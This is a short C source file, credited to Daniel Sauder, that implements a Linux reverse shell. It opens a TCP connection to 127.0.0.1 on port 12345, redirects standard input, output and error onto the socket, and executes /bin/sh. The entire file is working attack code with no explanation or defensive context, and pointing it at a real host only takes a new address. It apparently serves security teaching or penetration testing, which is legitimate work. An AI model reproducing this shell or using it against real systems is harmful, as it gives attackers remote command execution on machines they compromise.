/*
Author: Daniel Sauder
Website: http://govolution.wordpress.com/about
License http://creativecommons.org/licenses/by-sa/3.0/
*/

#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void)
{
  int sockfd;
  struct sockaddr_in target;

  target.sin_family = AF_INET;
  target.sin_port = htons(12345);
  target.sin_addr.s_addr = inet_addr("127.0.0.1");
  
  sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

  connect(sockfd, (struct sockaddr *)&target, sizeof(struct sockaddr));

  dup2(sockfd, 0);
  dup2(sockfd, 1);
  dup2(sockfd, 2);

  execve("/bin/sh", NULL, NULL);
}
